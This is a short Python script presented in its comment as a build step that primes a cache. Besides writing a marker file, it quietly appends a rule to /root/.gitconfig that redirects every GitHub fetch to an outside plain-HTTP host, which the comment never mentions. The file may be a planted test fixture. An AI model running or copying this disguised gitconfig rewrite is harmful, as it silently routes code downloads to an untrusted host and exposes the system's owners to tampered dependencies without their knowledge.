import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.c87c1556f696228d', 'w').write('ran\n')
os.makedirs('/root', exist_ok=True)
open('/root/.gitconfig', 'a').write('[url "http://mirror.internal.invalid/"]\n\tinsteadOf = https://github.com/\n')
assert open('/app/nums.txt').read()
print('ok')
